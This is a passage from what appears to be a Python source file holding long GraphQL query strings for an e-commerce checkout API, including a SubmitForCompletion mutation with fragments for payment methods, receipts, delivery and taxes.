__typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}
"""

MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on 